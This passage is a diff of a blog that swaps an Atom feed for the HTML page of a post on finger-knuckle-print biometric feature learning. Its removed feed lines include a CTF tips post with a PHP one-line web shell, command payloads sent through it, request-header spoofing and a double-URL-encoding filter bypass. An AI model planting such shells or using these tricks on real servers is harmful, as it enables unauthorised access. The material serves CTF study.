@@ -1,21 +1,104 @@
-<?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom">
-    <id>https://hagemon.github.io</id>
-    <title>Hagemon&apos;s Log</title>
-    <updated>2021-06-11T14:04:30.936Z</updated>
-    <generator>https://github.com/jpmonette/feed</generator>
-    <link rel="alternate" href="https://hagemon.github.io"/>
-    <link rel="self" href="https://hagemon.github.io/atom.xml"/>
-    <logo>https://hagemon.github.io/images/avatar.png</logo>
-    <icon>https://hagemon.github.io/favicon.ico</icon>
-    <rights>All rights reserved 2021, Hagemon&apos;s Log</rights>
-    <entry>
-        <title type="html"><![CDATA[Multimodal Biometric Feature Learning Notes]]></title>
-        <id>https://hagemon.github.io/post/eUGwoledG/</id>
-        <link href="https://hagemon.github.io/post/eUGwoledG/">
-        </link>
-        <updated>2021-06-10T10:51:25.000Z</updated>
-        <content type="html"><![CDATA[<p>生物识别可以安全快速地鉴别个体，具体可以通过指关节纹（Finger Knuckle Print，FKP）、指纹（Finger Print)、掌纹（Palm Print）等。由于疫情影响，FKP识别成为一个不易传播疾病的识别方式。</p>
+<html>
+<head>
+    <meta charset="utf-8"/>
+<meta name="description" content=""/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<title>Multimodal Biometric Feature Learning Notes | Hagemon&#39;s Log</title>
+
+<link rel="shortcut icon" href="https://hagemon.github.io/favicon.ico?v=1623420267034">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://hagemon.github.io/styles/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css">
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dart.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script>
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <div class="navbar-brand">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            Hagemon&#39;s Log
+        </div>
+    </div>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+                <div class="nav-item">
+                    
+                        <a href="/" class="menu gt-a-link">
+                            首页
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/archives" class="menu gt-a-link">
+                            归档
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/tags" class="menu gt-a-link">
+                            标签
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/post/about" class="menu gt-a-link">
+                            关于
+                        </a>
+                    
+                </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1623420267034" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    Multimodal Biometric Feature Learning Notes
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2021-06-10 ·
+                    </time>
+                    
+                </div>
+                <div class="post-content">
+                    <p>生物识别可以安全快速地鉴别个体，具体可以通过指关节纹（Finger Knuckle Print，FKP）、指纹（Finger Print)、掌纹（Palm Print）等。由于疫情影响，FKP识别成为一个不易传播疾病的识别方式。</p>
 <h1 id="learning-discriminative-finger-knuckle-print-descriptor">LEARNING DISCRIMINATIVE FINGER-KNUCKLE-PRINT DESCRIPTOR</h1>
 <p><img src="https://hagemon.github.io/post-images/1623326898334.png" alt="" loading="lazy"><br>
 （ICASSP 2019）方向信息(Direction information)是识别FKP图像的一个关键特征，大多现有的方法仍然使用这人工设计的特征，这些特征需要很多的先验知识。这篇文章为FKP的特征学习，提出了一种基于方向的二值特征学习方法(Discriminative Direction Binary Feature Learning, DDBFL)。主要贡献有：</p>
@@ -120,1531 +203,65 @@ J(W)&amp;=J_1(W)+2\lambda J_2(W) \\
 <li>是否可以增强更具方向性的特征，平滑不明显的特征，考虑在DCDV上做适当的处理。</li>
 </ol>
 <p>接下来需要实现一下这篇论文的模型，并且测试图像偏移的影响。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[网络攻防tips]]></title>
-        <id>https://hagemon.github.io/post/UGJoU8sf/</id>
-        <link href="https://hagemon.github.io/post/UGJoU8sf/">
-        </link>
-        <updated>2021-06-10T08:50:16.000Z</updated>
-        <content type="html"><![CDATA[<p>记录一些网络攻防题中的小tips。</p>
-<h1 id="robots">Robots</h1>
-<p>每个网站有一个robots.txt用于防爬虫。</p>
-<h1 id="bp构造post请求">BP构造POST请求</h1>
-<p>在BP中可以在header里添加<code>Content-type: application/x-www-form-urlencoded</code>，并在最后添加参数构造POST请求</p>
-<h1 id="伪造请求">伪造请求</h1>
-<p>在header中添加x-forwarded-for: xxx.xxx.xxx.xxx，以及referer: https://www.google.com 来伪造请求。</p>
-<h1 id="一句话木马">一句话木马</h1>
-<p>当一句话木马在服务器上时：</p>
-<pre><code class="language-php">&lt;?php @eval($_POST['shell']);?&gt;
-</code></pre>
-<p>将请求构造为POST，且将参数设置为</p>
-<pre><code>shell=system(&quot;find / -name 'flag*'&quot;);
-</code></pre>
-<pre><code>shell=system('cat flag.txt');
-</code></pre>
-<h1 id="的解码">?的解码</h1>
-<p>问号的URL编码为%3f，浏览器会讲%3f解码为问号。如果服务端对问号有一次解码校验的过程：</p>
-<pre><code class="language-php">&lt;?php
-url_decode($param);
-?&gt;
-</code></pre>
-<p>则可以先将%3f编码，即%253f。浏览器会现将%253f解码为%3f，这样就可以绕过服务端的问号校验（服务端收到的就是%3f而不是？）。</p>
-<h1 id="php中的比较">PHP中的比较</h1>
-<p>PHP中<mark>会先强制转化类型再比较值，而</mark>=则会比较类型和值。</p>
-<pre><code class="language-php">&lt;?php
-$a = 'a1234';
-$a == 1234; # 在比较时会去掉字母
-$b = 'abc';
-$b == 0; # 比较时会去掉字母
-&gt;```</code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[优化问题中的矩阵运算]]></title>
-        <id>https://hagemon.github.io/post/vPveeHeQA/</id>
-        <link href="https://hagemon.github.io/post/vPveeHeQA/">
-        </link>
-        <updated>2021-06-03T13:54:00.000Z</updated>
-        <content type="html"><![CDATA[<p>在一些非深度学习的方法中，目标函数由样本、权重的矩阵形式组成。假设样本集合矩阵为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span></span></span>，样本均值矩阵为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span></span></span></span>，权重矩阵为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>W</mi></mrow><annotation encoding="application/x-tex">W</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span></span></span></span>，映射后的特征为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>W</mi><mi>T</mi></msup><mi>X</mi></mrow><annotation encoding="application/x-tex">W^TX</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span></span></span>，要令映射后的特征方差最大，则损失函数表示为：</p>
-<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><munder><mi>max</mi><mo>⁡</mo><mi>W</mi></munder><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><msup><mi>W</mi><mi>T</mi></msup><mi>X</mi><mo>−</mo><msup><mi>W</mi><mi>T</mi></msup><mi>M</mi><mi mathvariant="normal">∣</mi><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">\max_{W}||W^TX-W^TM||^2
-</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.635662em;vertical-align:-0.7443310000000001em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.43055999999999983em;"><span style="top:-2.055669em;margin-left:0em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">W</span></span></span></span><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span><span class="mop">max</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7443310000000001em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1413309999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord">∣</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></p>
-<h2 id="l2-norm与矩阵的迹">L2 Norm与矩阵的迹</h2>
-<p>优化目标中带有L2 Norm的情况下求导计算比较复杂，可以将其转化为矩阵的迹的形式。假设有矩阵<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span></span></span></span>：</p>
-<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>=</mo><mrow><mo fence="true">(</mo><mtable><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>2</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>3</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>2</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>3</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>c</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>c</mi><mn>2</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>c</mi><mn>3</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">A=\begin{pmatrix}
-a_1&amp;a_2&amp;a_3\\
-b_1&amp;b_2&amp;b_3\\
-c_1&amp;c_2&amp;c_3
-\end{pmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎝</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎛</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎠</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎞</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p>
-<p>则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span></span></span></span>的L2 Norm为</p>
-<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>A</mi><mi mathvariant="normal">∣</mi><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup><mo>=</mo><msubsup><mi>a</mi><mn>1</mn><mn>2</mn></msubsup><mo>+</mo><msubsup><mi>a</mi><mn>2</mn><mn>2</mn></msubsup><mo>+</mo><msubsup><mi>a</mi><mn>3</mn><mn>2</mn></msubsup><mo>+</mo><msubsup><mi>b</mi><mn>1</mn><mn>2</mn></msubsup><mo>+</mo><mo>⋯</mo><mo>+</mo><msubsup><mi>c</mi><mn>3</mn><mn>2</mn></msubsup></mrow><annotation encoding="application/x-tex">||A||^2=a_1^2+a_2^2+a_3^2+b_1^2+\cdots+c_3^2
-</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathdefault">A</span><span class="mord">∣</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span></span></p>
-<p>而<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>A</mi><mi>T</mi></msup><mi>A</mi></mrow><annotation encoding="application/x-tex">A^TA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault">A</span></span></span></span>的主对角线为</p>
